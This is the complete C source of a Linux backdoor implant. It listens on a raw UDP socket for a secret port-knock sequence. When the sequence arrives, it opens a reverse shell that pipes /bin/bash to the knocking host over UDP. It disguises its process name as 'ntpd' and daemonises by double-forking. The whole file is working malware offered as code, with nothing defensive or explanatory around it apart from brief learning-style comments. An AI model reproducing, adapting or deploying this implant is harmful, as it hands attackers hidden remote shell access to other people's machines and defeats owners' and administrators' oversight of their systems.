#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <string.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <signal.h>
#include <sys/wait.h>
#include <time.h> //FD_SET, FD_ISSET, FD_ZERO macros

#define NAME_SPOOF "ntpd"

int knock_sequence[]      = { 4572, 1337, 8928, 29430 };
int knock_sequence_length = 4;
int cpid                  = 0;

struct port_knock {
  int hits;
  int last_hit;
  in_addr_t last_ip;
};

void error(char *e) {
  perror(e);
  exit(1);
}

void reaper_handle (int sig) {
  while (waitpid(-1, NULL, WNOHANG) > 0) { };
  cpid = 0;
}

void child_handle (int sig) {
  if (sig == SIGCHLD) {
    while (waitpid(-1, NULL, WNOHANG) > 0) { };
    exit(0);
  } else {
    kill(cpid, 9);
    exit(0);
  }
}

int start_binbash(int *infp, int *outfp) {
  char *cmd[] = { NAME_SPOOF,  NULL };
  int p_stdin[2], p_stdout[2];

  pipe(p_stdin);
  pipe(p_stdout);

  if ((cpid = fork()) == 0) {
    close(p_stdin[1]);
    dup2(p_stdin[0], 0);

    close(p_stdout[0]);
    dup2(p_stdout[1], 1);
    dup2(p_stdout[1], 2);
    execv("/bin/bash", cmd);
    exit(0);
  }

  *infp = p_stdin[1];
  *outfp = p_stdout[0];

  return 0;
}

int udp_connect(in_addr_t target, unsigned int target_port) {
  char buffer[10000];
  fd_set fds, master; //an fd_set is a set of sockets to monitor for some activity
  // set of socket descriptors

  int sock, len, infd, outfd;
  struct sockaddr_in server;
  struct sigaction child;

  child.sa_handler = child_handle;
  sigaction(SIGUSR1, &child, 0);
  sigaction(SIGCHLD, &child, 0);

  memset(buffer, 0, 10000);

  // type of socket created
  server.sin_family = AF_INET;
  server.sin_port = target_port;
  server.sin_addr.s_addr = target;

  if((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
    error("Error:");

  sendto(sock, buffer, 1, 0, (struct sockaddr *)&server, sizeof(struct sockaddr));
  start_binbash(&infd, &outfd);

  FD_ZERO(&fds); //clear a fd_set
  FD_ZERO(&master); //clear a fd_set
  FD_SET(sock, &master); // add a descriptor to a fd_set, add sock to master set
  FD_SET(outfd, &master); // add a descriptor to a fd_set
  // socket to set

  for (;;) {
    fds = master;
    select(outfd+1, &fds, NULL, NULL, NULL); // take a list of socket for minitoring them, timeout is NULL, so wait indefinitely
    // the select function blocks, until an activity occurs

    memset(buffer, 0, 10000);

    if(FD_ISSET(sock, &fds)) { //check if a descriptor is in fd_set, if sth happens on sock socket, then
      len = recvfrom(sock, buffer, 10000, 0, NULL, NULL);
      write(infd, buffer, len);
    }

    else if(FD_ISSET(outfd, &fds)) {
      len = read(outfd, buffer, 10000);
      sendto(sock, buffer, len, 0, (struct sockaddr *)&server, sizeof(struct sockaddr));
    }
  }

  return 0;
}

void portknock(const unsigned char *packet, struct port_knock *knockd) {

  printf("portknock being called\n");

  struct iphdr *ip_header = (struct iphdr*)packet;
  struct udphdr *udp_header = (struct udphdr*)(packet + ip_header->ihl * 4);

  if (!knockd->last_ip && ntohs(udp_header->dest) == knock_sequence[0]) // judge from the first matched port
    knockd->last_ip = ip_header->saddr;

  if (ip_header->saddr != knockd->last_ip || (knockd->hits != knock_sequence_length && ntohs(udp_header->dest) != knock_sequence[knockd->hits]))
    return;

  if (knockd->hits != 0 && time(NULL) - knockd->last_hit > 10) {
    memset(knockd, 0, sizeof(struct port_knock));
    return;
  }

  if (knockd->hits != knock_sequence_length) {
    knockd->last_hit = time(NULL);
    knockd->hits++;
    return;
  }

  if (cpid != 0) // not a child process
    kill(cpid, SIGUSR1);

  if ((cpid = fork()) == 0) {  //we are the chile process (== 0), we are the parent process (>0), we are the parent process, but child could not create (else)
    udp_connect(knockd->last_ip, udp_header->dest);
    exit(0);
  }

  memset(knockd, 0, sizeof(struct port_knock));
}

int main(int argc, char *argv[]) {
  int sniffer, sockaddr_size = sizeof(struct sockaddr);
  unsigned char *buffer = (unsigned char *)malloc(65536);
  struct sockaddr saddr;
  struct sigaction reaper;
  struct port_knock knockd;

  strncpy(argv[0], NAME_SPOOF, strlen(argv[0]));
  prctl(PR_SET_NAME, (unsigned long)NAME_SPOOF, 0, 0, 0);

  reaper.sa_handler = reaper_handle;
  sigaction(SIGCHLD, &reaper, 0);

  if((sniffer = socket(AF_INET , SOCK_RAW , IPPROTO_UDP)) < 0)
    error("Socket:");

  memset(&knockd, 0, sizeof(struct port_knock));

  if(fork() != 0) { exit(0); }
  if(fork() != 0) { exit(0); }

  while (1) {

    printf("Waiting for packet...\n");

    if(recvfrom(sniffer, buffer, 65536, 0, &saddr, &sockaddr_size) < 1) {
      perror("recvfrom()");
      exit(1);
    }
     // recvfrom returns the number of bytes actually received
    portknock(buffer, &knockd);
  }

  return 0;
}
